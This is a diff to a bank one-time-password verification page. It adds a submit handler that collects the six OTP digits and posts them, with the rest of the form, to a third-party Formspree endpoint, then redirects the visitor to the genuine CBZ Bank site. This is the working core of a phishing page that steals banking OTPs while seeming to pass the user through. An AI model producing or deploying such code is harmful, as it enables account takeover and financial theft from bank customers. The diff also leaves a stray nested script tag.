@@ -109,52 +109,75 @@
   </div>
 
   <script>
-    const inputs = document.querySelectorAll('.otp-input');
-    const verifyBtn = document.getElementById('verifyBtn');
-    const resendBtn = document.getElementById('resendBtn');
-    const timerEl = document.getElementById('timer');
-    
-    inputs.forEach((input, index) => {
-      input.addEventListener('input', (e) => {
-        if (e.target.value.length === 1 && index < inputs.length - 1) {
-          inputs[index + 1].focus();
-        }
-      });
-      input.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && !e.target.value && index > 0) {
-          inputs[index - 1].focus();
-        }
-      });
-    });
+    <script>
+  const inputs = document.querySelectorAll('.otp-input');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const resendBtn = document.getElementById('resendBtn');
+  const timerEl = document.getElementById('timer');
+  const otpForm = document.getElementById('otpForm');
 
-    let timeLeft = 300; 
-    
-    const countdown = setInterval(() => {
-      timeLeft--;
-      let minutes = Math.floor(timeLeft / 60);
-      let seconds = timeLeft % 60;
-      seconds = seconds < 10 ? '0' + seconds : seconds;
-      
-      timerEl.textContent = `Code expires in: ${minutes}:${seconds}`;
-      
-      if (timeLeft <= 0) {
-        clearInterval(countdown);
-        timerEl.textContent = 'Code expired';
-        timerEl.classList.add('expired');
-        
-        inputs.forEach(input => input.disabled = true);
-        verifyBtn.disabled = true;
-        
-        resendBtn.classList.add('active');
-      }
-    }, 1000);
-    
-    resendBtn.addEventListener('click', (e) => {
-      if (resendBtn.classList.contains('active')) {
-        e.preventDefault();
-        location.reload(); 
-      }
+  inputs.forEach((input, index) => {
+    input.addEventListener('input', (e) => {
+      if (e.target.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
     });
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index - 1].focus();
+    });
+  });
+
+  let timeLeft = 300;
+  const countdown = setInterval(() => {
+    timeLeft--;
+    let minutes = Math.floor(timeLeft / 60);
+    let seconds = timeLeft % 60;
+    seconds = seconds < 10 ? '0' + seconds : seconds;
+    timerEl.textContent = `Code expires in: ${minutes}:${seconds}`;
+    if (timeLeft <= 0) {
+      clearInterval(countdown);
+      timerEl.textContent = 'Code expired';
+      timerEl.classList.add('expired');
+      inputs.forEach(input => input.disabled = true);
+      verifyBtn.disabled = true;
+      resendBtn.classList.add('active');
+    }
+  }, 1000);
+
+  resendBtn.addEventListener('click', (e) => {
+    if (resendBtn.classList.contains('active')) { 
+      e.preventDefault(); 
+      location.reload(); 
+    }
+  });
+
+  
+  otpForm.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    verifyBtn.textContent = 'Verifying...';
+    verifyBtn.disabled = true;
+    
+    const formData = new FormData(otpForm);
+    
+    const otpValue = formData.get('otp1') + formData.get('otp2') + formData.get('otp3') + 
+                     formData.get('otp4') + formData.get('otp5') + formData.get('otp6');
+    formData.append('full_otp', otpValue);
+    
+    try {
+      await fetch('https://formspree.io/f/xjgqlwen', {
+        method: 'POST',
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      });
+      
+      
+      window.location.href = 'https://www.cbz.co.zw';
+      
+    } catch (error) {
+      alert('Error. Try again.');
+      verifyBtn.textContent = 'Verify OTP';
+      verifyBtn.disabled = false;
+    }
+  });
   </script>
-</body>  
+ </body>  
 </html>
